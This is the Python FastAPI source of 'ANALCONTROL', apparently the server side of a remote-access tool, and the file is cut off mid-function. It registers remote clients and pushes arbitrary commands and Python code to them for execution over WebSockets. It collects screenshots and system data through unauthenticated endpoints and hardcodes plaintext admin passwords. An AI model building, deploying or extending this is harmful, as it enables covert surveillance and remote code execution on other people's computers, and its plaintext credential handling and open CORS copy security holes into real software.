import os
import sys
import logging
from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, Request, status, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.responses import JSONResponse, HTMLResponse, FileResponse
from pydantic import BaseModel, Field
from typing import List, Dict, Optional, Any
from datetime import datetime, timedelta
import secrets
import json
import jwt
import asyncio
import uuid
import time
from supabase import create_client, Client
import base64
import hashlib

# ========== CONFIGURATION ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('analcontrol_backend.log')
    ]
)
logger = logging.getLogger(__name__)

# ========== CREATE FASTAPI APP ==========
app = FastAPI(
    title="ANALCONTROL API",
    version="3.0",
    description="Advanced Client Monitoring System with Supabase",
    docs_url="/docs",
    redoc_url="/redoc",
    openapi_url="/openapi.json"
)

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ========== ENVIRONMENT VARIABLES ==========
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))
PORT = int(os.getenv("PORT", "8000"))
SUPABASE_URL = os.getenv("SUPABASE_URL", "https://your-project.supabase.co")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "your-anon-key")
BACKEND_URL = os.getenv("BACKEND_URL", "https://dd-kpxl.onrender.com")

# ========== SUPABASE CLIENT ==========
try:
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
    logger.info("✅ Supabase client initialized")
except Exception as e:
    logger.error(f"❌ Failed to initialize Supabase: {e}")
    supabase = None

# Security
security = HTTPBearer()

# ========== DATA MODELS ==========
class LoginRequest(BaseModel):
    email: str = Field(..., example="admin")
    password: str = Field(..., example="admin123")

class UserCreate(BaseModel):
    email: str = Field(..., example="newadmin")
    password: str = Field(..., example="password123")
    confirm_password: str = Field(..., example="password123")
    is_admin: bool = Field(default=True)
    theme: str = Field(default="cyberpunk")

class UserUpdate(BaseModel):
    is_active: Optional[bool] = None
    is_admin: Optional[bool] = None
    theme: Optional[str] = None

class ClientRegister(BaseModel):
    client_id: str = Field(..., example="client-001")
    name: str = Field(..., example="Office Computer")
    ip_address: str = Field(..., example="192.168.1.100")
    os_info: str = Field(default="Unknown", example="Windows 11")
    hardware_info: Optional[Dict] = Field(default_factory=dict)

class CommandRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    command: str = Field(..., example="system_info")
    parameters: Dict[str, Any] = Field(default_factory=dict)

class PythonFileRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    filename: str = Field(..., example="script.py")
    content: str = Field(..., description="Python code content")
    parameters: Optional[List[str]] = Field(default_factory=list)

class ScreenshotRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    image_data: str = Field(..., description="Base64 encoded image")
    filename: str = Field(..., example="screenshot.png")

class SystemInfoRequest(BaseModel):
    client_id: str = Field(..., example="client-001")
    info: Dict[str, Any] = Field(default_factory=dict)

# ========== SECURITY FUNCTIONS ==========
def create_jwt_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    """Create JWT token"""
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(hours=24)
    
    to_encode.update({
        "exp": expire,
        "iat": datetime.utcnow(),
    })
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET_KEY, algorithm="HS256")
    return encoded_jwt

def verify_jwt_token(token: str) -> Optional[dict]:
    """Verify JWT token"""
    try:
        payload = jwt.decode(
            token, 
            JWT_SECRET_KEY, 
            algorithms=["HS256"],
            options={"verify_exp": True}
        )
        return payload
    except jwt.ExpiredSignatureError:
        logger.warning("JWT token expired")
        return None
    except jwt.InvalidTokenError as e:
        logger.warning(f"Invalid JWT token: {e}")
        return None

async def authenticate_user(credentials: HTTPAuthorizationCredentials = Depends(security)) -> dict:
    """Verify JWT token from request"""
    if not credentials:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Missing authentication token",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    token = credentials.credentials
    payload = verify_jwt_token(token)
    
    if not payload:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired authentication token",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    return payload

# ========== SUPABASE HELPER FUNCTIONS ==========
def hash_password(password: str) -> str:
    """Hash password using SHA256 (use bcrypt in production)"""
    return hashlib.sha256(password.encode()).hexdigest()

async def verify_supabase_user(email: str, password: str) -> Optional[dict]:
    """Verify user credentials against Supabase"""
    if not supabase:
        logger.error("Supabase not initialized")
        return None
    
    try:
        # Query users table
        response = supabase.table("users")\
            .select("*")\
            .eq("email", email.lower())\
            .eq("is_active", True)\
            .execute()
        
        if not response.data or len(response.data) == 0:
            return None
        
        user_data = response.data[0]
        
        # Verify password (in production, use proper password hashing)
        hashed_input = hash_password(password)
        
        # For now, accept direct password match or hashed match
        if (user_data.get("password") == password or 
            user_data.get("password_hash") == hashed_input or
            user_data.get("password_hash") == password):
            
            # Update last login
            supabase.table("users")\
                .update({"last_login": datetime.utcnow().isoformat()})\
                .eq("id", user_data["id"])\
                .execute()
            
            return {
                "id": user_data["id"],
                "email": user_data["email"],
                "is_admin": user_data.get("is_admin", False),
                "theme": user_data.get("theme", "cyberpunk"),
                "is_active": user_data.get("is_active", True)
            }
    
    except Exception as e:
        logger.error(f"Supabase auth error: {e}")
    
    return None

async def create_supabase_user(user_data: dict) -> Optional[dict]:
    """Create new user in Supabase"""
    if not supabase:
        return None
    
    try:
        # Check if user exists
        existing = supabase.table("users")\
            .select("*")\
            .eq("email", user_data["email"].lower())\
            .execute()
        
        if existing.data and len(existing.data) > 0:
            return None
        
        # Create user
        new_user = {
            "id": str(uuid.uuid4()),
            "email": user_data["email"].lower(),
            "password": user_data["password"],  # Store plain text (for compatibility)
            "password_hash": hash_password(user_data["password"]),  # Store hash
            "is_admin": user_data.get("is_admin", False),
            "theme": user_data.get("theme", "cyberpunk"),
            "is_active": True,
            "created_at": datetime.utcnow().isoformat(),
            "last_login": None
        }
        
        response = supabase.table("users").insert(new_user).execute()
        
        if response.data:
            return {
                "id": response.data[0]["id"],
                "email": response.data[0]["email"],
                "is_admin": response.data[0].get("is_admin", False),
                "theme": response.data[0].get("theme", "cyberpunk")
            }
    
    except Exception as e:
        logger.error(f"Create Supabase user error: {e}")
    
    return None

# ========== IN-MEMORY DATABASE (FALLBACK) ==========
class Database:
    def __init__(self):
        self.users = {}
        self.clients = {}
        self.commands = []
        self.logs = []
        self.sessions = {}
        self.init_default_data()
    
    def init_default_data(self):
        # Default users - with special theme for Nathan
        default_users = [
            {
                "id": str(uuid.uuid4()),
                "email": "xotiic",
                "password": "40671Mps19*",
                "is_admin": True,
                "is_active": True,
                "theme": "cyberpunk",
                "created_at": datetime.utcnow().isoformat(),
                "last_login": None
            },
            {
                "id": str(uuid.uuid4()),
                "email": "admin",
                "password": "admin123",
                "is_admin": True,
                "is_active": True,
                "theme": "cyberpunk",
                "created_at": datetime.utcnow().isoformat(),
                "last_login": None
            },
            {
                "id": str(uuid.uuid4()),
                "email": "kizer",
                "password": "kidraper67",
                "is_admin": True,
                "is_active": True,
                "theme": "cyberpunk",
                "created_at": datetime.utcnow().isoformat(),
                "last_login": None
            },
            {
                "id": str(uuid.uuid4()),
                "email": "nathan",
                "password": "femboy67",
                "is_admin": True,
                "is_active": True,
                "theme": "femboy",  # Special theme for Nathan
                "created_at": datetime.utcnow().isoformat(),
                "last_login": None
            }
        ]
        
        for user in default_users:
            self.users[user["email"].lower()] = user
        
        # Add some sample clients
        sample_clients = [
            {
                "id": str(uuid.uuid4()),
                "client_id": "client-001",
                "name": "Main Server",
                "ip_address": "192.168.1.100",
                "os_info": "Ubuntu 22.04",
                "online": False,
                "ws_online": False,
                "last_seen": datetime.utcnow().isoformat(),
                "registered_at": datetime.utcnow().isoformat()
            },
            {
                "id": str(uuid.uuid4()),
                "client_id": "client-002",
                "name": "Office PC",
                "ip_address": "192.168.1.101",
                "os_info": "Windows 11",
                "online": False,
                "ws_online": False,
                "last_seen": datetime.utcnow().isoformat(),
                "registered_at": datetime.utcnow().isoformat()
            }
        ]
        
        for client in sample_clients:
            self.clients[client["client_id"]] = client
    
    def get_user_by_email(self, email: str):
        return self.users.get(email.lower())
    
    def update_user_last_login(self, email: str):
        user = self.get_user_by_email(email)
        if user:
            user["last_login"] = datetime.utcnow().isoformat()

# Initialize database
db = Database()

# ========== WEBSOCKET MANAGER ==========
class ConnectionManager:
    def __init__(self):
        self.client_connections: Dict[str, WebSocket] = {}
        self.admin_connections: List[WebSocket] = []

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.admin_connections.append(websocket)
        logger.info(f"👑 Admin connected. Total admins: {len(self.admin_connections)}")

    async def connect_client(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.client_connections[client_id] = websocket
        logger.info(f"🖥️  Client connected: {client_id}. Total clients: {len(self.client_connections)}")
        
        # Update client status
        if client_id in db.clients:
            db.clients[client_id]["online"] = True
            db.clients[client_id]["ws_online"] = True
            db.clients[client_id]["last_seen"] = datetime.utcnow().isoformat()
        
        # Store in Supabase if available
        if supabase:
            try:
                supabase.table("clients")\
                    .update({
                        "online": True,
                        "ws_online": True,
                        "last_seen": datetime.utcnow().isoformat()
                    })\
                    .eq("client_id", client_id)\
                    .execute()
            except Exception as e:
                logger.error(f"Supabase update client error: {e}")
        
        # Notify admins
        await self.notify_admins({
            "type": "client_connected",
            "client_id": client_id,
            "timestamp": datetime.utcnow().isoformat(),
            "total_clients": len(self.client_connections)
        })

    def disconnect(self, websocket: WebSocket):
        # Remove from admin connections
        if websocket in self.admin_connections:
            self.admin_connections.remove(websocket)
            logger.info(f"👑 Admin disconnected. Total admins: {len(self.admin_connections)}")
        
        # Remove from client connections
        client_id = None
        for cid, ws in self.client_connections.items():
            if ws == websocket:
                client_id = cid
                break
        
        if client_id:
            del self.client_connections[client_id]
            logger.info(f"🖥️  Client disconnected: {client_id}. Total clients: {len(self.client_connections)}")
            
            # Update client status
            if client_id in db.clients:
                db.clients[client_id]["online"] = False
                db.clients[client_id]["ws_online"] = False
            
            # Update Supabase
            if supabase:
                try:
                    supabase.table("clients")\
                        .update({
                            "ws_online": False
                        })\
                        .eq("client_id", client_id)\
                        .execute()
                except Exception as e:
                    logger.error(f"Supabase update client offline error: {e}")
            
            # Notify admins
            asyncio.create_task(self.notify_admins({
                "type": "client_disconnected",
                "client_id": client_id,
                "timestamp": datetime.utcnow().isoformat(),
                "total_clients": len(self.client_connections)
            }))

    async def notify_admins(self, message: dict):
        """Send message to all admin connections"""
        disconnected = []
        for connection in self.admin_connections:
            try:
                await connection.send_json(message)
            except Exception as e:
                logger.error(f"Failed to send to admin: {e}")
                disconnected.append(connection)
        
        # Remove disconnected admins
        for connection in disconnected:
            if connection in self.admin_connections:
                self.admin_connections.remove(connection)

    async def send_to_client(self, client_id: str, message: dict) -> bool:
        """Send message to specific client"""
        if client_id in self.client_connections:
            try:
                await self.client_connections[client_id].send_json(message)
                return True
            except Exception as e:
                logger.error(f"Failed to send to client {client_id}: {e}")
                # Remove disconnected client
                if client_id in self.client_connections:
                    del self.client_connections[client_id]
                return False
        return False

manager = ConnectionManager()

# ========== API ROUTES ==========
@app.post("/api/login", response_model=dict)
async def login(data: LoginRequest):
    """Login endpoint - tries Supabase first, falls back to in-memory"""
    try:
        logger.info(f"Login attempt for user: {data.email}")
        
        user_data = None
        
        # Try Supabase first
        if supabase:
            user_data = await verify_supabase_user(data.email, data.password)
        
        # Fallback to in-memory database
        if not user_data:
            user = db.get_user_by_email(data.email)
            
            if not user:
                logger.warning(f"User not found: {data.email}")
                raise HTTPException(status_code=401, detail="Invalid credentials")
            
            if not user.get("is_active", True):
                logger.warning(f"User account inactive: {data.email}")
                raise HTTPException(status_code=401, detail="Account is inactive")
            
            if user.get("password") != data.password:
                logger.warning(f"Password verification failed for user: {data.email}")
                raise HTTPException(status_code=401, detail="Invalid credentials")
            
            user_data = {
                "id": user["id"],
                "email": user["email"],
                "is_admin": user.get("is_admin", False),
                "theme": user.get("theme", "cyberpunk"),
                "is_active": user.get("is_active", True)
            }
            
            # Update last login
            db.update_user_last_login(data.email)
        
        logger.info(f"✅ User authenticated: {user_data.get('email')}")
        
        # Create JWT token
        token_data = {
            "sub": user_data["email"],
            "email": user_data["email"],
            "is_admin": user_data["is_admin"],
            "user_id": user_data["id"],
            "theme": user_data.get("theme", "cyberpunk")
        }
        
        access_token = create_jwt_token(token_data)
        
        return {
            "success": True,
            "token": access_token,
            "user": {
                "email": user_data["email"],
                "is_admin": user_data["is_admin"],
                "user_id": user_data["id"],
                "theme": user_data.get("theme", "cyberpunk")
            },
            "expires_in": 86400
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Login error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/create-account", response_model=dict)
async def create_account(data: UserCreate, user: dict = Depends(authenticate_user)):
    """Create a new user account (admin only)"""
    try:
        # Check if user is admin
        if not user.get("is_admin"):
            raise HTTPException(status_code=403, detail="Admin access required")
        
        # Check if passwords match
        if data.password != data.confirm_password:
            raise HTTPException(status_code=400, detail="Passwords do not match")
        
        if len(data.password) < 6:
            raise HTTPException(status_code=400, detail="Password must be at least 6 characters")
        
        # Try to create in Supabase first
        new_user = None
        if supabase:
            new_user = await create_supabase_user({
                "email": data.email,
                "password": data.password,
                "is_admin": data.is_admin,
                "theme": data.theme
            })
        
        # Fallback to in-memory database
        if not new_user and not db.get_user_by_email(data.email):
            new_user = {
                "id": str(uuid.uuid4()),
                "email": data.email,
                "password": data.password,
                "is_admin": data.is_admin,
                "theme": data.theme,
                "is_active": True,
                "created_at": datetime.utcnow().isoformat(),
                "last_login": None
            }
            
            db.users[data.email.lower()] = new_user
            logger.info(f"✅ Account created in memory for: {data.email}")
        
        if not new_user:
            raise HTTPException(status_code=400, detail="User already exists")
        
        return {
            "success": True,
            "message": "Account created successfully",
            "email": data.email,
            "is_admin": data.is_admin,
            "theme": data.theme
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Create account error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/users", response_model=dict)
async def get_users(user: dict = Depends(authenticate_user)):
    """Get all users (admin only)"""
    try:
        # Check if user is admin
        if not user.get("is_admin"):
            raise HTTPException(status_code=403, detail="Admin access required")
        
        users = []
        
        # Get from Supabase if available
        if supabase:
            response = supabase.table("users")\
                .select("id, email, is_admin, theme, is_active, last_login, created_at")\
                .execute()
            
            if response.data:
                users = response.data
        
        # Add in-memory users
        for user_data in db.users.values():
            users.append({
                "id": user_data["id"],
                "email": user_data["email"],
                "is_admin": user_data.get("is_admin", False),
                "theme": user_data.get("theme", "cyberpunk"),
                "is_active": user_data.get("is_active", True),
                "created_at": user_data.get("created_at"),
                "last_login": user_data.get("last_login")
            })
        
        # Remove duplicates
        unique_users = {}
        for u in users:
            if u["email"] not in unique_users:
                unique_users[u["email"]] = u
        
        return {
            "success": True,
            "users": list(unique_users.values())
        }
        
    except Exception as e:
        logger.error(f"Get users error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/register-client", response_model=dict)
async def register_client(data: ClientRegister, request: Request):
    """Register a new client"""
    try:
        # Get client IP from request
        if not data.ip_address or data.ip_address == "127.0.0.1":
            client_ip = request.headers.get('X-Forwarded-For', request.client.host)
            if client_ip:
                data.ip_address = client_ip.split(',')[0].strip()
            else:
                data.ip_address = "Unknown"
        
        # Check if client exists in memory
        action = "updated" if data.client_id in db.clients else "registered"
        
        # Update in-memory database
        client_data = {
            "id": str(uuid.uuid4()) if data.client_id not in db.clients else db.clients[data.client_id]["id"],
            "client_id": data.client_id,
            "name": data.name,
            "ip_address": data.ip_address,
            "os_info": data.os_info,
            "hardware_info": data.hardware_info or {},
            "online": True,
            "last_seen": datetime.utcnow().isoformat(),
            "registered_at": datetime.utcnow().isoformat() if action == "registered" else db.clients[data.client_id].get("registered_at", datetime.utcnow().isoformat())
        }
        
        db.clients[data.client_id] = client_data
        
        # Store in Supabase if available
        if supabase:
            try:
                # Check if client exists in Supabase
                existing = supabase.table("clients")\
                    .select("*")\
                    .eq("client_id", data.client_id)\
                    .execute()
                
                client_data_db = {
                    "client_id": data.client_id,
                    "name": data.name,
                    "ip_address": data.ip_address,
                    "os_info": data.os_info,
                    "hardware_info": data.hardware_info or {},
                    "online": True,
                    "last_seen": datetime.utcnow().isoformat(),
                    "updated_at": datetime.utcnow().isoformat()
                }
                
                if existing.data and len(existing.data) > 0:
                    # Update existing
                    supabase.table("clients")\
                        .update(client_data_db)\
                        .eq("client_id", data.client_id)\
                        .execute()
                else:
                    # Create new
                    client_data_db.update({
                        "registered_at": datetime.utcnow().isoformat(),
                        "created_at": datetime.utcnow().isoformat()
                    })
                    supabase.table("clients").insert(client_data_db).execute()
                
            except Exception as e:
                logger.error(f"Supabase client registration error: {e}")
        
        # Add log entry
        log_entry = {
            "id": str(uuid.uuid4()),
            "client_id": data.client_id,
            "log_type": "info",
            "message": f"Client {action}: {data.name} ({data.client_id})",
            "created_at": datetime.utcnow().isoformat()
        }
        
        db.logs.append(log_entry)
        
        # Store log in Supabase
        if supabase:
            try:
                supabase.table("logs").insert({
                    "client_id": data.client_id,
                    "log_type": "info",
                    "message": f"Client {action}: {data.name}",
                    "created_at": datetime.utcnow().isoformat()
                }).execute()
            except Exception as e:
                logger.error(f"Supabase log insertion error: {e}")
        
        logger.info(f"Client {action}: {data.client_id}")
        
        return {
            "success": True, 
            "message": f"Client {action} successfully",
            "client_id": data.client_id,
            "action": action
        }
        
    except Exception as e:
        logger.error(f"Client registration error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/clients", response_model=dict)
async def get_clients(
    user: dict = Depends(authenticate_user),
    online_only: bool = Query(False),
    search: Optional[str] = Query(None)
):
    """Get all clients"""
    try:
        clients_list = []
        
        # Get from Supabase if available
        if supabase:
            query = supabase.table("clients").select("*")
            
            if search:
                query = query.or_(f"name.ilike.%{search}%,client_id.ilike.%{search}%")
            
            response = query.order("last_seen", desc=True).execute()
            
            if response.data:
                clients_list = response.data
        else:
            # Fallback to in-memory
            clients_list = list(db.clients.values())
            
            if search:
                search_lower = search.lower()
                clients_list = [c for c in clients_list if 
                              search_lower in c.get("client_id", "").lower() or
                              search_lower in c.get("name", "").lower() or
                              search_lower in c.get("ip_address", "").lower()]
        
        # Filter if needed
        if online_only:
            clients_list = [c for c in clients_list if c.get("online")]
        
        # Mark clients as online if they have active WebSocket connections
        for client in clients_list:
            client["ws_online"] = client.get("client_id") in manager.client_connections
        
        # Sort by last seen
        clients_list.sort(key=lambda x: x.get("last_seen", ""), reverse=True)
        
        return {
            "success": True,
            "clients": clients_list
        }
    except Exception as e:
        logger.error(f"Get clients error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/command", response_model=dict)
async def send_command(data: CommandRequest, user: dict = Depends(authenticate_user)):
    """Send command to client"""
    try:
        # Check if client exists
        client_exists = False
        if supabase:
            response = supabase.table("clients")\
                .select("*")\
                .eq("client_id", data.client_id)\
                .execute()
            client_exists = bool(response.data)
        else:
            client_exists = data.client_id in db.clients
        
        if not client_exists:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Create command record
        command_id = str(uuid.uuid4())
        command_data = {
            "id": command_id,
            "client_id": data.client_id,
            "command": data.command,
            "parameters": data.parameters,
            "status": "pending",
            "user_email": user.get("email", "unknown"),
            "created_at": datetime.utcnow().isoformat()
        }
        
        # Store in memory
        db.commands.append(command_data)
        
        # Store in Supabase
        if supabase:
            try:
                supabase.table("commands").insert(command_data).execute()
            except Exception as e:
                logger.error(f"Supabase command storage error: {e}")
        
        # Send via WebSocket
        sent = await manager.send_to_client(data.client_id, {
            "type": "command",
            "command_id": command_id,
            "command": data.command,
            "parameters": data.parameters,
            "timestamp": datetime.utcnow().isoformat(),
            "from_user": user.get("email", "unknown")
        })
        
        if not sent:
            # Update command status if WebSocket failed
            command_data["status"] = "failed"
            command_data["error"] = "Client not connected"
            
            if supabase:
                try:
                    supabase.table("commands")\
                        .update({
                            "status": "failed",
                            "error": "Client not connected"
                        })\
                        .eq("id", command_id)\
                        .execute()
                except Exception as e:
                    logger.error(f"Supabase command update error: {e}")
        
        return {
            "success": True,
            "command_id": command_id,
            "sent_via_websocket": sent,
            "client_id": data.client_id,
            "message": "Command queued for execution"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Send command error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/execute-python", response_model=dict)
async def execute_python_file(data: PythonFileRequest, user: dict = Depends(authenticate_user)):
    """Execute Python file on client"""
    try:
        # Check if client is connected via WebSocket
        if data.client_id not in manager.client_connections:
            raise HTTPException(status_code=400, detail="Client not connected")
        
        # Send via WebSocket
        sent = await manager.send_to_client(data.client_id, {
            "type": "python_execute",
            "command_id": str(uuid.uuid4()),
            "filename": data.filename,
            "content": data.content,
            "parameters": data.parameters or [],
            "from_user": user.get("email", "unknown"),
            "timestamp": datetime.utcnow().isoformat()
        })
        
        if not sent:
            raise HTTPException(status_code=400, detail="Failed to send command to client")
        
        # Log the execution
        log_entry = {
            "id": str(uuid.uuid4()),
            "client_id": data.client_id,
            "log_type": "info",
            "message": f"Python execution sent: {data.filename}",
            "created_at": datetime.utcnow().isoformat()
        }
        
        db.logs.append(log_entry)
        
        if supabase:
            try:
                supabase.table("logs").insert({
                    "client_id": data.client_id,
                    "log_type": "info",
                    "message": f"Python execution sent: {data.filename}",
                    "created_at": datetime.utcnow().isoformat()
                }).execute()
            except Exception as e:
                logger.error(f"Supabase Python log error: {e}")
        
        return {
            "success": True,
            "message": "Python file sent for execution",
            "filename": data.filename,
            "client_id": data.client_id
        }
        
    except Exception as e:
        logger.error(f"Execute Python error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/screenshot", response_model=dict)
async def upload_screenshot(data: ScreenshotRequest):
    """Upload screenshot"""
    try:
        # Validate image data
        try:
            image_data = base64.b64decode(data.image_data)
        except:
            raise HTTPException(status_code=400, detail="Invalid image data")
        
        # Store in memory
        screenshot_data = {
            "id": str(uuid.uuid4()),
            "client_id": data.client_id,
            "image_data": data.image_data,
            "filename": data.filename,
            "size": len(image_data),
            "created_at": datetime.utcnow().isoformat()
        }
        
        # We'll just store metadata, not the actual image in memory
        screenshot_metadata = {
            "id": screenshot_data["id"],
            "client_id": data.client_id,
            "filename": data.filename,
            "size": len(image_data),
            "created_at": datetime.utcnow().isoformat()
        }
        
        # Store in Supabase if available
        if supabase:
            try:
                supabase.table("screenshots").insert(screenshot_data).execute()
            except Exception as e:
                logger.error(f"Supabase screenshot storage error: {e}")
        
        # Add log
        log_entry = {
            "id": str(uuid.uuid4()),
            "client_id": data.client_id,
            "log_type": "info",
            "message": f"Screenshot captured: {data.filename}",
            "created_at": datetime.utcnow().isoformat()
        }
        
        db.logs.append(log_entry)
        
        if supabase:
            try:
                supabase.table("logs").insert({
                    "client_id": data.client_id,
                    "log_type": "info",
                    "message": f"Screenshot captured: {data.filename}",
                    "created_at": datetime.utcnow().isoformat()
                }).execute()
            except Exception as e:
                logger.error(f"Supabase screenshot log error: {e}")
        
        return {
            "success": True,
            "message": "Screenshot uploaded",
            "filename": data.filename,
            "size": len(image_data)
        }
        
    except Exception as e:
        logger.error(f"Upload screenshot error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/system-info", response_model=dict)
async def upload_system_info(data: SystemInfoRequest):
    """Upload system information"""
    try:
        # Store in memory
        system_info_data = {
            "id": str(uuid.uuid4()),
            "client_id": data.client_id,
            "info": data.info,
            "created_at": datetime.utcnow().isoformat()
        }
        
        # Store in Supabase if available
        if supabase:
            try:
                supabase.table("system_info").insert({
                    "client_id": data.client_id,
                    "cpu_info": data.info.get("cpu", {}),
                    "memory_info": data.info.get("memory", {}),
                    "disk_info": data.info.get("disk", {}),
                    "network_info": data.info.get("network", {}),
                    "process_list": data.info.get("processes", []),
                    "created_at": datetime.utcnow().isoformat()
                }).execute()
            except Exception as e:
                logger.error(f"Supabase system info storage error: {e}")
        
        return {
            "success": True,
            "message": "System information uploaded",
            "client_id": data.client_id
        }
        
    except Exception as e:
        logger.error(f"Upload system info error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/commands", response_model=dict)
async def get_commands(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    status: Optional[str] = Query(None),
    limit: int = Query(50, ge=1, le=1000)
):
    """Get recent commands"""
    try:
        commands_list = []
        
        # Get from Supabase if available
        if supabase:
            query = supabase.table("commands").select("*")
            
            if client_id:
                query = query.eq("client_id", client_id)
            
            if status:
                query = query.eq("status", status)
            
            response = query.order("created_at", desc=True).limit(limit).execute()
            
            if response.data:
                commands_list = response.data
        else:
            # Fallback to in-memory
            commands_list = db.commands.copy()
            
            # Apply filters
            if client_id:
                commands_list = [c for c in commands_list if c.get("client_id") == client_id]
            
            if status:
                commands_list = [c for c in commands_list if c.get("status") == status]
            
            # Sort by date
            commands_list.sort(key=lambda x: x.get("created_at", ""), reverse=True)
            commands_list = commands_list[:limit]
        
        return {
            "success": True,
            "commands": commands_list
        }
    except Exception as e:
        logger.error(f"Get commands error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/logs", response_model=dict)
async def get_logs(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    log_type: Optional[str] = Query(None),
    limit: int = Query(100, ge=1, le=1000)
):
    """Get system logs"""
    try:
        logs_list = []
        
        # Get from Supabase if available
        if supabase:
            query = supabase.table("logs").select("*")
            
            if client_id:
                query = query.eq("client_id", client_id)
            
            if log_type and log_type != "all":
                query = query.eq("log_type", log_type)
            
            response = query.order("created_at", desc=True).limit(limit).execute()
            
            if response.data:
                logs_list = response.data
        else:
            # Fallback to in-memory
            logs_list = db.logs.copy()
            
            # Apply filters
            if client_id:
                logs_list = [l for l in logs_list if l.get("client_id") == client_id]
            
            if log_type and log_type != "all":
                logs_list = [l for l in logs_list if l.get("log_type") == log_type]
            
            # Sort by date
            logs_list.sort(key=lambda x: x.get("created_at", ""), reverse=True)
            logs_list = logs_list[:limit]
        
        return {
            "success": True,
            "logs": logs_list
        }
    except Exception as e:
        logger.error(f"Get logs error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/stats", response_model=dict)
async def get_stats(user: dict = Depends(authenticate_user)):
    """Get system statistics"""
    try:
        stats = {
            "total_clients": 0,
            "online_clients": 0,
            "ws_online_clients": len(manager.client_connections),
            "pending_commands": 0,
            "total_commands": 0,
            "today_logs": 0,
            "total_screenshots": 0,
            "total_users": 0
        }
        
        # Get from Supabase if available
        if supabase:
            try:
                # Get counts
                clients_resp = supabase.table("clients").select("count").execute()
                online_resp = supabase.table("clients").select("count").eq("online", True).execute()
                commands_resp = supabase.table("commands").select("count").execute()
                pending_resp = supabase.table("commands").select("count").eq("status", "pending").execute()
                screenshots_resp = supabase.table("screenshots").select("count").execute()
                users_resp = supabase.table("users").select("count").execute()
                
                # Get today's logs
                today = datetime.utcnow().date().isoformat()
                logs_resp = supabase.table("logs")\
                    .select("count")\
                    .gte("created_at", f"{today}T00:00:00")\
                    .execute()
                
                if clients_resp.data:
                    stats["total_clients"] = clients_resp.data[0]["count"]
                if online_resp.data:
                    stats["online_clients"] = online_resp.data[0]["count"]
                if commands_resp.data:
                    stats["total_commands"] = commands_resp.data[0]["count"]
                if pending_resp.data:
                    stats["pending_commands"] = pending_resp.data[0]["count"]
                if logs_resp.data:
                    stats["today_logs"] = logs_resp.data[0]["count"]
                if screenshots_resp.data:
                    stats["total_screenshots"] = screenshots_resp.data[0]["count"]
                if users_resp.data:
                    stats["total_users"] = users_resp.data[0]["count"]
                    
            except Exception as e:
                logger.error(f"Supabase stats error: {e}")
        
        # Add in-memory data
        stats["total_clients"] = max(stats["total_clients"], len(db.clients))
        stats["online_clients"] = max(stats["online_clients"], len([c for c in db.clients.values() if c.get("online")]))
        stats["total_commands"] = max(stats["total_commands"], len(db.commands))
        stats["pending_commands"] = max(stats["pending_commands"], len([c for c in db.commands if c.get("status") in ["pending", "running"]]))
        stats["today_logs"] = max(stats["today_logs"], len([l for l in db.logs if l.get("created_at", "").startswith(datetime.utcnow().date().isoformat())]))
        stats["total_users"] = max(stats["total_users"], len(db.users))
        
        stats["active_admins"] = len(manager.admin_connections)
        
        return {
            "success": True,
            "stats": stats
        }
    except Exception as e:
        logger.error(f"Get stats error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

# ========== HEALTH AND INFO ==========
@app.get("/api/health", response_model=dict)
async def health_check():
    """Health check endpoint"""
    try:
        health_status = {
            "status": "healthy",
            "timestamp": datetime.utcnow().isoformat(),
            "version": "3.0",
            "database": "Supabase + In-Memory" if supabase else "In-Memory",
            "active_clients": len(manager.client_connections),
            "active_admins": len(manager.admin_connections),
            "total_users": len(db.users),
            "total_clients": len(db.clients),
            "supabase_connected": supabase is not None
        }
        
        return health_status
    except Exception as e:
        logger.error(f"Health check error: {e}")
        return {
            "status": "unhealthy",
            "timestamp": datetime.utcnow().isoformat(),
            "error": str(e)
        }

@app.get("/api/user/theme", response_model=dict)
async def get_user_theme(user: dict = Depends(authenticate_user)):
    """Get user's theme"""
    try:
